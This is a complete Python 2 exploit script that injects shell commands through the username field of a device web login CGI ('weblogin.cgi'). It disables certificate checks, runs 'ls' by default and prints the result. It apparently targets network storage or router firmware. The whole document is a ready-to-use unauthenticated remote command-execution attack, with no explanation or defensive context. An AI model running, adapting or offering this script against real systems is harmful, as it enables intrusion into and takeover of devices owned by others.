#!/usr/bin/env python
# coding: utf-8
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exec_command(target, command):
    injection = "admin';%s #" %(command)
    data = {"password": "asdf",
            "username": injection}
    url = target + "/,adv/cgi-bin/weblogin.cgi"
    try:
        r = requests.post(url=url, data=data, verify=False)
    except Exception, e:
        print e
        return None
    return r.text

def main(args):
    if len(args) != 2:
        sys.exit("use: %s http://1.1.1.1" %(args[0]))
    print exec_command(target=args[1], command="ls")

if __name__ == "__main__":
    main(args=sys.argv)
